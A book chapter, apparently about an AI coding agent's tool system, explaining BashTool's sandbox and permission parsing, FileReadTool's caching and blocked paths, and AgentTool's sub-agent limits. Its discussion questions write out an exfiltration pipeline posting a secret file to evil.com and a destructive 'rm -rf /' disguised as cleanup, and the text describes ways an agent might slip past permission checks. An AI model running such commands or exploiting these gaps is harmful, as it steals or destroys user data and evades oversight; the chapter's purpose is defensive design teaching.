# Chapter 7: A Tour of 40 Tools -- From File I/O to the Browser

> This chapter is not a catalog of 40 tools. From the 40+ tools in the tool directory, we select three representative case studies that illustrate the most critical tradeoffs in tool design: safety vs. capability (BashTool), efficiency vs. correctness (FileReadTool), simplicity vs. generality (AgentTool).

The previous chapter dissected the skeleton of a tool -- every field of the Tool type. This chapter puts flesh on those bones, entering real tool implementations to see how abstract interface methods are filled in for concrete scenarios.

```
+-------------- Harness ----------------+
|                                       |
|   Agent Loop --> API --> LLM          |
|       |                               |
|       v                               |
|   Tool System                         |
|   +----------------------------+      |
|   | * BashTool     Safety      |      |
|   |                vs. capability|     |
|   | * FileReadTool Efficiency   |      |
|   |                vs. correctness|    |
|   | * AgentTool    Simplicity   |      |
|   |                vs. generality|     |
|   |   ... 37 other tools ...   |      |
|   +----------------------------+      |
|                                       |
+---------------------------------------+
This chapter focuses on: implementation details and
design tradeoffs in three representative tools
```

## 7.1 BashTool -- How Do You Make the Most Dangerous Tool Safe?

**The problem: Shell commands are the most powerful tool and the most dangerous. How do you control risk without crippling capability?**

BashTool is the most complex single component in the entire tool system, exceeding 2,000 lines of code. Its complexity does not come from the implementation itself (calling a shell to execute commands is not difficult) but from a fundamental contradiction: you need to give the LLM the ability to execute arbitrary shell commands while preventing it from causing irreversible damage. This contradiction cannot be perfectly resolved -- it can only be managed through multiple layers of defense. Let us dissect BashTool's core design decisions layer by layer.

### Approach 1: Schema design that tolerates the model's imprecision

BashTool's input schema illustrates the difference between LLM-facing and human-facing interface design:

```pseudocode
// BashTool input schema with lenient parsing (conceptual)
timeout: semanticNumber(optional Number),
run_in_background: semanticBoolean(optional Boolean),
```

`semanticNumber` and `semanticBoolean` are "lenient parsers." LLMs sometimes output `true` as the string `"true"` or the number `5000` as `"5000"`. Human programmers do not make these mistakes, but LLM output is fundamentally a probabilistic token-sequence sample, and type boundaries are frequently blurred. Rather than rejecting these "approximately correct" inputs and showing the model a validation error (which it may not understand), a silent conversion layer absorbs the difference. This is a universal strategy in LLM-facing API design: liberal in what you accept, strict in what you produce.

More subtly, there is an internal field `_simulatedSedEdit`. This field is never exposed to the model -- it is removed from the external schema via `omit`. It exists to solve a permission preview consistency problem: when the model issues a `sed` command, the system displays a file diff preview in the permission dialog. After the user approves, if `sed` is then actually executed, the result might differ from the preview (the file could have been modified between preview and execution). This internal field lets the system inject the precomputed edit result directly, bypassing actual execution and ensuring "what you see is what you get."

Why use `omit` rather than simply not declaring the field? Security. If the model could see this field in the schema, it could construct a harmless command paired with arbitrary file writes, bypassing permission checks and the sandbox. The schema is the model's visible capability boundary -- hiding a field closes an attack surface.

### Approach 2: Concurrent safety is a function of the command, not a constant of the tool

BashTool's concurrent safety evaluation demonstrates the "per-invocation judgment" principle from Chapter 6 in practice:

```pseudocode
// BashTool concurrent safety evaluation chain (conceptual)
isConcurrencySafe(input):
  return this.isReadOnly(input) ?? false

isReadOnly(input):
  hasCd = commandHasAnyCd(input.command)
  result = checkReadOnlyConstraints(input, hasCd)
  return result.behavior == 'allow'
```

The evaluation chain is: concurrent safe <- read-only <- command AST analysis. The read-only constraint check parses the command's abstract syntax tree, identifies read-only commands (`cat`, `ls`, `grep`), detects `cd` (changing the working directory is a side effect), and detects pipe writes. Only when every segment of the command chain is read-only is parallel execution permitted.

This means `cat a.txt | grep pattern` can run in parallel with other Read operations, while `cat a.txt | python script.py` cannot -- because `python script.py` has unknown side effects. Conservative but correct.

There is another safety-related detail: BashTool supports a sandbox mode that limits filesystem and network access during command execution. The model can request disabling the sandbox via a parameter -- the "dangerously" prefix in the parameter name is a "naming as documentation" safety design, making the model (and auditors) aware this is a high-risk operation. The tool name displayed in the UI also changes accordingly: `SandboxedBash` when sandboxed, `Bash` otherwise, giving the user a visual signal.

BashTool also supports background execution (the `run_in_background` parameter). When a command is expected to run for a long time (e.g., `npm install`, `cargo build`), the model can choose to run it in the background, immediately receiving a task ID and output file path to check results later with the Read tool. But not all commands are suitable for backgrounding -- certain commands (like `sleep`) are excluded and should use MonitorTool instead. In "assistant mode," commands that block for more than 15 seconds are automatically backgrounded, a UX-driven timeout policy.

### Approach 3: Command classification drives UI folding

BashTool defines three command classification groups:

```pseudocode
// Command classification (conceptual)
BASH_SEARCH_COMMANDS = Set([
  'find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'
])
BASH_READ_COMMANDS = Set([
  'cat', 'head', 'tail', 'less', 'more', 'wc', 'stat', 'file', 'strings',
  'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'
])
BASH_LIST_COMMANDS = Set(['ls', 'tree', 'du'])
```

These classifications do not affect execution logic -- only UI presentation. The search/read command analysis function checks **every segment** in a pipeline. For `cat file | grep pattern | sort`, every segment is a read/search command, so the entire command is marked as foldable -- the UI collapses it to a one-line summary. But if any segment in the pipeline is not a read/search command (e.g., `cat file | python script.py`), it is not folded.

"Semantically neutral" commands (`echo`, `printf`, `true`, `false`, `:`) are skipped in the evaluation. In `ls dir && echo "---" && ls dir2`, `echo` does not alter the overall "read/search" nature of the command, so it remains foldable. This per-pipeline-segment classification logic strikes a balance between conciseness and accuracy in the UI.

### Approach 4: Permission matching requires parsing the command AST

BashTool's permission matching preparation function demonstrates another safety design. When the Hooks system needs to determine whether a command matches a permission rule (e.g., `Bash(git *)` matches all git commands), it cannot simply do string matching.

Consider the command `FOO=bar git push`. String matching against `git *` would fail (because the command starts with `FOO=bar`), but semantically this is indeed a git command. The safe parser extracts the command AST, extracts each subcommand's argv (stripping leading environment variable assignments), and then performs pattern matching on the argv.

For compound commands (e.g., `ls && git push`), the matching logic is "trigger on any matching subcommand." The reasoning is that hooks have deny-like semantics -- "no match = skip the hook." If compound commands were not decomposed, `ls && git push` would not trigger the `Bash(git *)` safety Hook -- a security vulnerability.

When AST parsing fails (malformed or overly complex command syntax), the permission matching function returns "match all" -- causing every Hook to run. This is yet another embodiment of the fail-closed principle: when unable to determine, choose the more restrictive path.


## 7.2 FileReadTool -- How Do You Optimize the Most Frequently Used Tool?

**The problem: File reading is the Agent's most frequent operation. When 18% of reads are duplicates, how do you save tokens without compromising correctness?**

FileReadTool has far less code than BashTool, but its edge case density is higher. It handles five file types (text, image, PDF, notebook, SVG), each with different reading logic, size controls, and return formats. Its `maxResultSizeChars` is set to `Infinity`, meaning its results are never persisted to disk -- it controls output size itself through token limits and byte size limits. We focus on the four most instructive designs.

### Approach 1: Intelligent deduplication based on mtime

FileReadTool implements an elegant deduplication mechanism:

```pseudocode
// Mtime-based file deduplication (conceptual)
existingState = dedupEnabled ? readFileState.get(fullFilePath) : undefined
if existingState
   and not existingState.isPartialView
   and existingState.offset is defined:
  rangeMatch = (existingState.offset == offset and existingState.limit == limit)
  if rangeMatch:
    mtimeMs = await getFileModificationTime(fullFilePath)
    if mtimeMs == existingState.timestamp:
      return { data: { type: 'file_unchanged', file: { filePath } } }
```

In Agent conversations, the model frequently calls Read on the same file multiple times (e.g., confirming results after an edit). If the file has not been modified and the read range is the same, a `file_unchanged` stub is returned instead of resending the entire content. Data analysis shows approximately 18% of Read calls are same-file collisions.

But deduplication has a trap: the `existingState.offset is defined` condition appears redundant but is actually critical. FileEditTool and FileWriteTool also update the file state cache after editing (writing the post-edit mtime), but they set offset to `undefined`. If deduplication matched against post-Edit state, `file_unchanged` would refer to the **pre-edit** Read content -- the model would incorrectly believe the file has not changed. `offset is defined` distinguishes "state from Read" and "state from Edit/Write."

There is another interesting edge case: macOS screenshot file path handling. Different macOS versions use different space characters before AM/PM in screenshot filenames -- some use a regular space (U+0020), others use a narrow no-break space (U+202F). When the model tries to read a screenshot file and it is not found, FileReadTool automatically attempts to substitute space character variants. This kind of defensive "fix the path for the user (or model)" design reflects the fact that interfacing tools with the real world is often full of platform-specific details.

### Approach 2: Path as the first line of defense

FileReadTool defines a set of blocked device paths:

```pseudocode
// Blocked device paths (conceptual)
BLOCKED_DEVICE_PATHS = Set([
  '/dev/zero',     // Infinite output -- never reaches EOF
  '/dev/random',   // Infinite output
  '/dev/urandom',  // Infinite output
  '/dev/stdin',    // Blocks waiting for input
  '/dev/tty',      // Blocks waiting for input
  '/dev/console',  // Blocks waiting for input
  '/dev/stdout',   // Reading is meaningless
  '/dev/stderr',   // Reading is meaningless
])
```

This is pure path checking with no I/O involved. Why not wait until the read to handle errors? Because reading `/dev/zero` does not produce an error -- it outputs zero bytes infinitely, and the process never returns. This is not a problem that "can be covered by a timeout": once reading begins, the process is trapped in a never-ending I/O loop.

This embodies a security design principle: **intercept at the earliest stage with the lightest-weight measure**. The path check is completed during input validation, with zero I/O overhead -- earlier and cheaper than any defense in the execute method.

Similar defenses include UNC path checking. On Windows, paths starting with `\\` or `//` are UNC network paths. If file operations were performed before the permission check, NTLM credentials could be leaked. So UNC paths are format-checked during input validation only, with actual filesystem operations deferred until after user authorization. The timing and layering of defenses is critical in security design.

### Approach 3: Reading a file can trigger skill discovery

FileReadTool includes a seemingly unrelated piece of logic during file reads:

```pseudocode
// Skill discovery triggered by file reads (conceptual)
newSkillDirs = await discoverSkillDirsForPaths([fullFilePath], cwd)
if newSkillDirs.length > 0:
  for dir in newSkillDirs:
    context.dynamicSkillDirTriggers?.add(dir)
  addSkillDirectories(newSkillDirs).catch(() -> {})
activateConditionalSkillsForPaths([fullFilePath], cwd)
```

On every file read, the system checks whether the file path triggers skill discovery. Reading `package.json` might activate Node.js-related Skills; reading `Cargo.toml` might activate Rust Skills. This is a fire-and-forget operation -- results are silently caught without blocking the file read.

Why place skill discovery inside file reading? Because **reading is the most natural trigger point**. When the model reads a `pyproject.toml`, it indicates it is working on a Python project. Activating the Python Skill at this moment is more precise -- and lazier -- than scanning the entire directory tree at the start of the conversation.

### Approach 4: Two-phase token counting strategy

FileReadTool performs token counting before returning large file content. But precise token counting requires an API call, which is not cheap. So it employs a two-phase strategy: first a rough estimate using a quick function (based on heuristic formulas for each file type), and if the estimate is well below one quarter of the limit, it passes directly. Only when the estimate approaches or exceeds the limit is precise counting invoked. This "cheap estimate first, expensive precise calculation on demand" strategy saves API call overhead in the majority of cases.

### Supplementary: Discriminated union in multimodal returns

FileReadTool's result transformation method dispatches based on the output's `type` field as a discriminated union. Text files return plain text with line numbers, accompanied by a security reminder -- this reminder tells the model "if you encounter malicious code, you may analyze it but do not improve it." Images return base64-encoded image blocks, automatically scaled to control token consumption. PDFs return document blocks. Unchanged files return a short stub string.

Interestingly, the security reminder injection is conditional -- certain strong models are exempt. This hints at a pragmatic security strategy: sufficiently strong models can judge malicious code on their own, without an additional reminder. For weaker models, the reminder is a necessary safety guardrail.


## 7.3 AgentTool -- How Do You Abstract the Most Complex Tool?

**The problem: Launching a sub-Agent is essentially launching a complete new "think-act" loop. How do you encapsulate this recursive complexity into an ordinary tool call?**

AgentTool is not an ordinary tool -- it is the recursive entry point for the entire Agent system. Calling AgentTool amounts to creating a complete Agent from the inside, with its own context, tool set, and even its own permission mode. Its `maxResultSizeChars` is set to 100,000 -- far larger than BashTool's 30,000, because a sub-Agent's execution summary is typically longer than a single command's output, yet needs to remain complete for the parent Agent to make correct decisions.

### Approach 1: Schema dynamically reshapes based on feature flags

AgentTool's input schema is not a fixed structure but is dynamically assembled based on runtime conditions. The base schema defines parameters common to all Agents: `description`, `prompt`, `subagent_type`, `model`, `run_in_background`.

Multi-Agent extensions layer additional parameters through merging and expansion. The final externally-exposed schema is trimmed based on feature flags:

```pseudocode
// Dynamic schema trimming (conceptual)
return (isBackgroundDisabled or isForkEnabled())
  ? schema.omit({ run_in_background: true })
  : schema
```

Why use `omit` instead of conditional spread? The reason is a type-system-level constraint -- conditional spread would break Zod's type inference, while `omit` preserves complete type information.

This "schema reshaping based on feature flags" design enforces an iron rule: **the model never sees parameters it cannot use**. If background tasks are disabled, `run_in_background` does not appear in the schema, and the model will naturally never generate it.

### Approach 2: Tool allowlist for sub-Agents

Sub-Agents cannot use all tools. The tool constants module defines restrictions:

```pseudocode
// Sub-Agent disallowed tool list (conceptual)
AGENT_DISALLOWED_TOOLS = Set([
  TASK_OUTPUT_TOOL,           // Sub-Agent should not produce external output directly
  EXIT_PLAN_MODE_TOOL,        // Plan mode is a main-thread UI abstraction
  ENTER_PLAN_MODE_TOOL,       // Same as above
  conditionally(AGENT_TOOL),  // Nested Agents disabled for external users by default
  ASK_USER_QUESTION_TOOL,     // Sub-Agent has no UI; would block
  TASK_STOP_TOOL,             // Requires main-thread task state
])
```

Each prohibition has a specific rationale:

- The task output tool is disallowed -- it is the channel for outputting results to external systems (e.g., CI), and sub-Agents should not produce external output directly.
- Sub-Agents cannot enter plan mode -- it is a main-thread UI abstraction that has no meaning in the sub-Agent's UI-less environment.
- Sub-Agents cannot directly ask the user -- they interact indirectly through the main Agent, and the ask tool would block in a UI-less environment.
- The task stop tool is disallowed -- it needs access to the main thread's task state to stop other Agents, and sub-Agents lack this authority.
- The most subtle rule: whether sub-Agents can launch sub-Agents (recursive nesting) depends on user type. Internal users are allowed nested Agents to support complex multi-Agent collaboration scenarios; external users are blocked by default to control cost and complexity.

### Approach 3: Five execution paths, one entry point

AgentTool's execute method is one of the longest single methods in the codebase because it handles five fundamentally different execution modes:

1. **Synchronous Agent**: Launch a sub-Agent, wait for completion, return a result summary. The most common path.
2. **Async/background Agent**: Launch and return immediately with an agent ID and output file path; the caller checks progress later. Suitable for long-running tasks.
3. **Teammate Agent**: Launch as an independent process via a tmux pane, with its own terminal and output. Suitable for collaborative scenarios requiring human interaction.
4. **Remote Agent**: Launch in a remote environment, fully decoupled. Suitable for compute-intensive tasks.
5. **Worktree isolation**: Launch within a git worktree with an independent filesystem copy, avoiding file operation conflicts with the main thread. Suitable for parallel modifications across different branches of the same repository.

These five paths share a single entry point and schema. The model does not need to know about the underlying dispatch logic. It simply says "launch an Agent to do this," and the system automatically routes to the correct path based on the parameter combination.

This is AgentTool's most important abstraction contribution: **unifying the multiple complex implementations of "launching another Agent" under the semantics of a single tool call**. The model's cognitive burden is constant, while the system's capabilities expand as new paths are added.

### Supplementary: Dual-channel progress forwarding

AgentTool forwards two types of progress events: Agent state changes and stdout/stderr updates from shell commands within the sub-Agent. This lets the outer Agent and the UI see real-time progress of nested execution -- when a sub-Agent is running a long compilation, the user sees streaming compilation output rather than a blank wait.

This "progress transparency" design means AgentTool is not merely a "fire and wait" tool; it is a **transparent execution proxy** that exposes internal execution details outward while maintaining the simplicity of the tool call interface.

AgentTool's `maxResultSizeChars` of 100,000 is the highest among all tools (except FileReadTool's Infinity). This reflects the unique nature of sub-Agent execution results: they are not the output of a single command or the content of a single file, but the execution summary of a complete task, potentially including aggregated results from multiple tool call turns. Truncating this summary could cause the parent Agent to lose critical information.


## 7.4 Cross-Cutting Comparison: Design Patterns Across Three Tools

Looking across BashTool, FileReadTool, and AgentTool, several shared patterns repeatedly surface, revealing deeper patterns in tool design:

**Pattern 1: lazySchema.** All three tools wrap their input definitions in lazy schemas. The reason is that Zod schema construction may reference runtime values (configuration items, feature flags, environment variables), and module loading order is uncontrollable. Lazy evaluation ensures schemas are built only on first use, avoiding circular dependencies and timing issues during loading.

**Pattern 2: Separating validateInput from checkPermissions.** `validateInput` performs pure parameter legality checks (does the path exist? Is the range valid? Is the device path safe?), does not involve user interaction, and returns error messages to the model directly on failure -- extremely low cost. `checkPermissions` makes authorization decisions and may trigger a UI dialog awaiting user confirmation -- higher cost. The separation lets validation failures provide fast feedback (milliseconds) while permission denials go through the full interaction flow (potentially seconds of user response time).

**Pattern 3: Path extraction and input normalization as metadata.** File-related tools implement a path extraction method that returns the file paths involved in the operation. This method is not for execution -- it is for external systems. Hooks, permission rules, and analytics systems all use it to know which file the tool is operating on without having to parse the tool's full input.

Relatedly, the input normalization method expands relative paths to absolute paths before Hooks and SDK observers see the input. This ensures that permission allowlists cannot be bypassed by `~` or relative paths -- observers always see normalized absolute paths.

**Pattern 4: Stratified maxResultSizeChars policies.** `Infinity` (FileReadTool) means "I control my own size"; `100_000` (AgentTool) means "output is large but completeness is required"; `30_000` (BashTool) means "command output typically does not need to be huge." These numbers are not arbitrarily chosen -- they reflect empirical judgments about each tool's output characteristics.

**Pattern 5: Selective strict mode.** Both BashTool and FileReadTool enable strict mode. This flag causes the API to enforce schema constraints more strictly when processing tool calls. Not all tools enable strict -- it is a tradeoff. Strict mode reduces the probability of format errors in model output but may also over-reject reasonable inputs in certain edge cases.

**Pattern 6: Semantic extraction for the security classifier.** Each tool provides a compact input representation for the automatic permission classifier. BashTool returns the command itself (the command is the basis for safety judgment), FileReadTool returns the file path (the path implies the operation's safety), and many low-risk tools return an empty string (skip the classifier -- no security-relevant information to extract). This design implies a principle: **the cost of security classification should be proportional to the risk**.


## 7.5 Implicit Contracts Between Tools

Tools do not run in isolation. Through shared execution context and file state cache, they form implicit collaborative relationships, collectively constituting a "tool ecosystem."

**State sharing between FileReadTool and FileEditTool.** After an Edit operation, the file state cache's mtime is updated, so subsequent Reads do not return `file_unchanged` (the file has indeed changed) but instead return the newly edited content. But Edit deliberately sets offset to `undefined`, preventing the deduplication mechanism from false matching.

**Bridging BashTool's sed edits with FileEditTool.** When a Bash command is a sed edit, the safe parser parses it and displays a file diff preview in the permission dialog. After user approval, the simulated edit path writes directly -- this path ultimately updates the file state cache, allowing subsequent FileReads to detect the change.

**Tool discovery chain between AgentTool and ToolSearchTool.** Sub-Agent tool sets are filtered. If a sub-Agent needs a filtered-out tool, it can call ToolSearch -- but ToolSearch's search scope is also subject to filtering.

These collaborative relationships are not established through explicit interface contracts but occur indirectly through shared state. This design is flexible but fragile -- changing the timing of one tool's file state cache update could affect another tool's deduplication correctness. This is the eternal tension between "simplicity" and "explicitness" in practical engineering.

One more cross-tool mechanism worth mentioning is sibling cancellation. When multiple tools execute in parallel, a Bash command error cancels all sibling Bash commands. But only Bash errors trigger sibling cancellation -- Read or WebFetch errors do not. The reason is that Bash commands often have implicit dependency chains (`mkdir` failure makes subsequent commands pointless), while read operations are independent of each other. This policy is not defined within individual tools but is implemented in the orchestration layer (StreamingToolExecutor); the next chapter will detail its mechanics.

Finally, it is worth emphasizing: these three tools (BashTool, FileReadTool, AgentTool) were chosen as case studies not because they are the "best" tool implementations, but because they each represent one of three typical tensions in tool design. BashTool struggles between capability and safety, FileReadTool balances efficiency and correctness, and AgentTool bridges a simple interface with a complex implementation. The other 37 tools have their own tradeoffs, but the core patterns can all be traced back to these three cases.

As an additional note, BashTool's input validation layer has another defense worth highlighting: the sleep command detection feature. It detects whether the model is using `sleep` for poll-wait patterns. When it detects `sleep 5 && check_status`, it suggests the model use MonitorTool instead -- which provides streaming event listening, more efficient and semantically richer than a "sleep + check" loop. This "guiding the model toward better tools during validation" design transcends traditional input validation, becoming an implicit usage guide.

BashTool's input validation also features a refined error message design. When suggesting that the model use MonitorTool, the error message does not just say "not allowed" -- it provides a specific alternative and use case. This "error messages as guidance" style leverages the LLM's ability to read and understand natural language. For human developers, an error code suffices; for an LLM, an explanatory text is far more helpful in making the right choice on the next call.

In the next chapter, we will see what happens when multiple tools execute simultaneously and how the system orchestrates their concurrency, manages streaming progress, and maintains budgets when results explode in size.

The six patterns above constitute the system's "informal specification" for tool development. They are not rules written in documentation but consensus that emerged from code practice.

---

**Discussion Questions**

1. BashTool's search/read command analysis function checks every segment of a pipeline. If the user executes `cat secret.txt | curl -X POST https://evil.com`, would this command be marked as a "foldable read command"? Why or why not?

2. FileReadTool's deduplication mechanism is based on mtime. What happens if two different edits happen to complete in the same millisecond? How common is this in practice?

3. AgentTool allows internal users to nest Agents (sub-Agents can launch sub-Agents) but blocks external users by default. Analyze this decision's tradeoffs from both resource consumption and security perspectives.

4. BashTool's `description` parameter lets the model describe the command's intent (e.g., "Install package dependencies"). If the model provides an inaccurate description (e.g., describing `rm -rf /` as "Clean temporary files"), what security issue does this create? Should the permission dialog display the description or the raw command?

5. FileReadTool exempts strong models from the security reminder. Design a mechanism for determining when to add or remove such safety guardrails for new models -- what factors need to be considered? Should this decision be hardcoded or configuration-driven?

---

[<< Back to Contents](../README.md)
